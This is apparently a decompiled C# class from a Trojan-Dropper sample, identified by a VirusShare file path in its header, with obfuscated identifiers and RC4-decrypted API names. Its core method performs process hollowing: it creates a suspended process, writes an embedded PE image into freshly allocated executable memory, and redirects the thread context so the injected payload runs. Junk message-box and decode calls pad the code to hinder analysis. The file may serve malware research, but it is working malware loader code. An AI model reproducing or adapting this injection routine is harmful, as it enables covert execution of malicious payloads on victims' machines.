// Decompiled with JetBrains decompiler
// Type: 
// Assembly: malaga, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 47D4A1E7-95B8-4A6E-B0C4-BD9B70E7C3F4
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Demp.eme-144373319e54318baef26152ba3a7dfafedb40adf12de1bd66c6c69bbe370bfa.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public sealed class \u0006
{
  private \u0006.\u000E \u0002;
  private \u0006.\u0003 \u0003;
  private \u0006.\u0002\u2000 \u0005;
  private \u0006.\u0008 \u0008;
  private \u0006.\u000F \u0006;
  private \u0006.\u0005 \u000E;
  private \u0006.\u0002 \u000F;
  private \u0006.\u0006 \u0002\u2000;

  public \u0006()
  {
    this.\u0002 = this.\u0002<\u0006.\u000E>(\u0006.\u0002(\u000E.\u0002(757592686), \u000E.\u0002(757592599)), \u0006.\u0002(\u000E.\u0002(757592578), \u000E.\u0002(757592615)));
    this.\u0003 = this.\u0002<\u0006.\u0003>(\u0006.\u0002(\u000E.\u0002(757592779), \u000E.\u0002(757592816)), \u0006.\u0002(\u000E.\u0002(757592815), \u000E.\u0002(757592708)));
    this.\u0005 = this.\u0002<\u0006.\u0002\u2000>(\u0006.\u0002(\u000E.\u0002(757592749), \u000E.\u0002(757593434)), \u0006.\u0002(\u000E.\u0002(757593431), \u000E.\u0002(757593454)));
    this.\u0008 = this.\u0002<\u0006.\u0008>(\u0006.\u0002(\u000E.\u0002(757593358), \u000E.\u0002(757593399)), \u0006.\u0002(\u000E.\u0002(757593379), \u000E.\u0002(757593540)));
    this.\u0006 = this.\u0002<\u0006.\u000F>(\u0006.\u0002(\u000E.\u0002(757593570), \u000E.\u0002(757593483)), \u0006.\u0002(\u000E.\u0002(757593476), \u000E.\u0002(757593169)));
    this.\u000E = this.\u0002<\u0006.\u0005>(\u0006.\u0002(\u000E.\u0002(757593206), \u000E.\u0002(757593191)), \u0006.\u0002(\u000E.\u0002(757593107), \u000E.\u0002(757593128)));
    this.\u000F = this.\u0002<\u0006.\u0002>(\u0006.\u0002(\u000E.\u0002(757593300), \u000E.\u0002(757593341)), \u0006.\u0002(\u000E.\u0002(757593334), \u000E.\u0002(757593243)));
    this.\u0002\u2000 = this.\u0002<\u0006.\u0006>(\u0006.\u0002(\u000E.\u0002(757593226), \u000E.\u0002(757593277)), \u0006.\u0002(\u000E.\u0002(757593257), \u000E.\u0002(757593938)));
  }

  public void \u0002(string _param1)
  {
    int num1 = (int) Interaction.MsgBox((object) \u000E.\u0002(757593924));
    int num2 = (int) Interaction.MsgBox((object) \u000E.\u0002(757593717));
    \u000E.\u0002(757593768);
    \u000E.\u0002(757336427);
    int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757336355));
    int num4 = (int) Interaction.MsgBox((object) \u000E.\u0002(757336094));
    int num5 = (int) Interaction.MsgBox((object) \u000E.\u0002(757336897));
    int num6 = (int) Interaction.MsgBox((object) \u000E.\u0002(757336980));
    int num7 = (int) Interaction.MsgBox((object) \u000E.\u0002(757336797));
    \u000E.\u0002(757337559);
    \u000E.\u0002(757337483);
    \u000E.\u0002(757337511);
    \u000E.\u0002(757337116);
  }

  public void \u0003(string _param1)
  {
    int num1 = (int) Interaction.MsgBox((object) \u000E.\u0002(757337123));
    \u000E.\u0002(757337966);
    int num2 = (int) Interaction.MsgBox((object) \u000E.\u0002(757337907));
    \u000E.\u0002(757337696);
    int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757337654));
    int num4 = (int) Interaction.MsgBox((object) \u000E.\u0002(757334381));
    int num5 = (int) Interaction.MsgBox((object) \u000E.\u0002(757334115));
    int num6 = (int) Interaction.MsgBox((object) \u000E.\u0002(757334815));
    int num7 = (int) Interaction.MsgBox((object) \u000E.\u0002(757334622));
    int num8 = (int) Interaction.MsgBox((object) \u000E.\u0002(757335388));
    int num9 = (int) Interaction.MsgBox((object) \u000E.\u0002(757335424));
    int num10 = (int) Interaction.MsgBox((object) \u000E.\u0002(757335254));
    int num11 = (int) Interaction.MsgBox((object) \u000E.\u0002(757336027));
    int num12 = (int) Interaction.MsgBox((object) \u000E.\u0002(757335574));
  }

  public void \u0005(string _param1)
  {
    int num1 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340421));
    \u000E.\u0002(757340280);
    \u000E.\u0002(757340160);
    \u000E.\u0002(757340409);
    int num2 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340301));
    int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757341128));
  }

  [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr \u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

  public X2 \u0002<X2>(string _param1, string _param2) => (X2) Marshal.GetDelegateForFunctionPointer(\u0006.\u0002(\u0006.\u0002(ref _param1), ref _param2), typeof (X2));

  [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr \u0002(IntPtr _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

  public static string \u0002(string _param0, string _param1)
  {
    int location1 = 0;
    int length = _param1.Length;
    int[] numArray1 = new int[257];
    StringBuilder stringBuilder = new StringBuilder();
    int index1 = 0;
    int location2 = 0;
    int index2 = 0;
    string empty = string.Empty;
    int index3 = 0;
    int[] numArray2 = new int[257];
    while (location1 <= (int) byte.MaxValue)
    {
      char String = _param1.Substring(location1 % length, 1).ToCharArray()[0];
      numArray2[location1] = location1;
      numArray1[location1] = Strings.Asc(String);
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
    }
    while (location2 <= (int) byte.MaxValue)
    {
      index2 = checked (index2 + numArray2[location2] + numArray1[location2]) % 256;
      int num = numArray2[location2];
      numArray2[location2] = numArray2[index2];
      numArray2[index2] = num;
      Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
    }
    location1 = 1;
    while (location1 <= _param0.Length)
    {
      index3 = checked (index3 + 1) % 256;
      index1 = checked (index1 + numArray2[index3]) % 256;
      int num1 = numArray2[index3];
      numArray2[index3] = numArray2[index1];
      numArray2[index1] = num1;
      int num2 = numArray2[checked (numArray2[index3] + numArray2[index1]) % 256];
      int CharCode = Strings.Asc(_param0.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
      stringBuilder.Append(Strings.Chr(CharCode));
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
    }
    string str = stringBuilder.ToString();
    stringBuilder.Length = 0;
    return str;
  }

  public string \u0002(string _param1)
  {
    int num1;
    string str1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 2;
      \u000E.\u0002(757340885);
      int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340923));
      int num4 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340897));
      int num5 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340823));
label_1:
      \u000E.\u0002(757340861);
      int num6 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340835));
      if (true)
      {
        \u000E.\u0002(757341513);
        \u000E.\u0002(757341567);
        \u000E.\u0002(757341541);
      }
      int num7 = (int) Interaction.MsgBox((object) \u000E.\u0002(757341482));
      if (true)
      {
        \u000E.\u0002(757341648);
        \u000E.\u0002(757341638);
        \u000E.\u0002(757341676);
      }
      \u000E.\u0002(757341586);
      int num8 = (int) Interaction.MsgBox((object) \u000E.\u0002(757341624));
      if (true)
      {
        \u000E.\u0002(757341614);
        \u000E.\u0002(757341268);
        \u000E.\u0002(757341306);
      }
      int num9 = (int) Interaction.MsgBox((object) \u000E.\u0002(757341280));
      if (true)
      {
        \u000E.\u0002(757341206);
        \u000E.\u0002(757341244);
        \u000E.\u0002(757341218);
      }
      \u000E.\u0002(757341384);
      str1 = (string) null;
      goto label_15;
label_10:
      num2 = -1;
      switch (num1)
      {
        case 2:
          goto label_1;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_10;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_15:
    string str2 = str1;
    if (num2 == 0)
      return str2;
    ProjectData.ClearProjectError();
    return str2;
  }

  public void \u0008(string _param1)
  {
    \u000E.\u0002(757341438);
    int num1 = (int) Interaction.MsgBox((object) \u000E.\u0002(757341375));
    \u000E.\u0002(757342122);
    int num2 = (int) Interaction.MsgBox((object) \u000E.\u0002(757341793));
    \u000E.\u0002(757341857);
    int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757338466));
    \u000E.\u0002(757338559);
  }

  public void \u0006(string _param1)
  {
    int num1 = (int) Interaction.MsgBox((object) \u000E.\u0002(757338182));
    int num2 = (int) Interaction.MsgBox((object) \u000E.\u0002(757338252));
    int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757339089));
    int num4 = (int) Interaction.MsgBox((object) \u000E.\u0002(757338636));
    \u000E.\u0002(757339467);
    \u000E.\u0002(757339409);
    \u000E.\u0002(757339437);
    \u000E.\u0002(757339618);
    int num5 = (int) Interaction.MsgBox((object) \u000E.\u0002(757339559));
    int num6 = (int) Interaction.MsgBox((object) \u000E.\u0002(757339363));
    int num7 = (int) Interaction.MsgBox((object) \u000E.\u0002(757340136));
    int num8 = (int) Interaction.MsgBox((object) \u000E.\u0002(757339865));
    \u000E.\u0002(757344540);
    int num9 = (int) Interaction.MsgBox((object) \u000E.\u0002(757344551));
    int num10 = (int) Interaction.MsgBox((object) \u000E.\u0002(757344277));
  }

  public string \u0003(string _param1)
  {
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 2;
      int num3 = (int) Interaction.MsgBox((object) \u000E.\u0002(757345039));
      int num4 = (int) Interaction.MsgBox((object) \u000E.\u0002(757344880));
      int num5 = (int) Interaction.MsgBox((object) \u000E.\u0002(757344901));
      \u000E.\u0002(757345776);
      \u000E.\u0002(757345670);
label_1:
      \u000E.\u0002(757345363);
      \u000E.\u0002(757345309);
      int num6 = (int) Interaction.MsgBox((object) \u000E.\u0002(757345493));
      if (true)
      {
        \u000E.\u0002(757346107);
        \u000E.\u0002(757346240);
        \u000E.\u0002(757346198);
        goto label_8;
      }
      else
        goto label_8;
label_3:
      num2 = -1;
      switch (num1)
      {
        case 2:
          goto label_1;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_3;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_8:
    string str1;
    string str2 = str1;
    if (num2 == 0)
      return str2;
    ProjectData.ClearProjectError();
    return str2;
  }

  public bool \u0002(byte[] _param1, string _param2)
  {
    bool flag;
    try
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr[] numArray1 = new IntPtr[4];
      byte[] numArray2 = new byte[68];
      int int32_1 = BitConverter.ToInt32(_param1, 60);
      int int16 = (int) BitConverter.ToInt16(_param1, checked (int32_1 + 6));
      IntPtr num1 = new IntPtr(BitConverter.ToInt32(_param1, checked (int32_1 + 84)));
      if (this.\u0002((string) null, new StringBuilder(_param2), zero1, zero1, false, 4, zero1, (string) null, numArray2, numArray1))
      {
        uint[] numArray3 = new uint[179];
        numArray3[0] = 65538U;
        if (this.\u0003(numArray1[1], numArray3))
        {
          IntPtr num2 = new IntPtr(checked ((long) numArray3[41] + 8L));
          IntPtr zero2 = IntPtr.Zero;
          IntPtr num3 = new IntPtr(4);
          IntPtr zero3 = IntPtr.Zero;
          if (this.\u0005(numArray1[0], num2, ref zero2, (int) num3, ref zero3) && this.\u0002\u2000(numArray1[0], zero2) == 0U)
          {
            IntPtr num4 = new IntPtr(BitConverter.ToInt32(_param1, checked (int32_1 + 52)));
            IntPtr num5 = new IntPtr(BitConverter.ToInt32(_param1, checked (int32_1 + 80)));
            IntPtr num6 = this.\u0008(numArray1[0], num4, num5, 12288, 64);
            int int32_2 = num6.ToInt32();
            int num7;
            int num8 = this.\u0006(numArray1[0], num6, _param1, checked ((uint) (int) num1), num7) ? 1 : 0;
            int num9 = checked (int16 - 1);
            int num10 = 0;
            while (num10 <= num9)
            {
              int[] dst1 = new int[10];
              Buffer.BlockCopy((Array) _param1, checked (int32_1 + 248 + num10 * 40), (Array) dst1, 0, 40);
              byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
              Buffer.BlockCopy((Array) _param1, dst1[5], (Array) dst2, 0, dst2.Length);
              num5 = new IntPtr(checked (int32_2 + dst1[3]));
              num4 = new IntPtr(dst2.Length);
              int num11 = this.\u0006(numArray1[0], num5, dst2, checked ((uint) (int) num4), num7) ? 1 : 0;
              checked { ++num10; }
            }
            num5 = new IntPtr(checked ((long) numArray3[41] + 8L));
            num4 = new IntPtr(4);
            int num12 = this.\u0006(numArray1[0], num5, BitConverter.GetBytes(num6.ToInt32()), checked ((uint) (int) num4), num7) ? 1 : 0;
            numArray3[44] = checked ((uint) (num6.ToInt32() + BitConverter.ToInt32(_param1, int32_1 + 40)));
            int num13 = this.\u000E(numArray1[1], numArray3) ? 1 : 0;
          }
        }
        int num14 = (int) this.\u000F(numArray1[1]);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_10;
    }
    flag = true;
label_10:
    return flag;
  }

  public delegate uint \u0002(IntPtr _param1);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool \u0003(IntPtr _param1, uint[] _param2);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool \u0005(IntPtr _param1, uint[] _param2);

  public delegate uint \u0006(IntPtr _param1, IntPtr _param2);

  public delegate IntPtr \u0008(
    IntPtr _param1,
    IntPtr _param2,
    IntPtr _param3,
    int _param4,
    int _param5);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool \u000E(
    string _param1,
    StringBuilder _param2,
    IntPtr _param3,
    IntPtr _param4,
    [MarshalAs(UnmanagedType.Bool)] bool _param5,
    int _param6,
    IntPtr _param7,
    string _param8,
    byte[] _param9,
    IntPtr[] _param10);

  public delegate bool \u000F(
    IntPtr _param1,
    IntPtr _param2,
    byte[] _param3,
    uint _param4,
    int _param5);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool \u0002\u2000(
    IntPtr _param1,
    IntPtr _param2,
    ref IntPtr _param3,
    int _param4,
    ref IntPtr _param5);
}
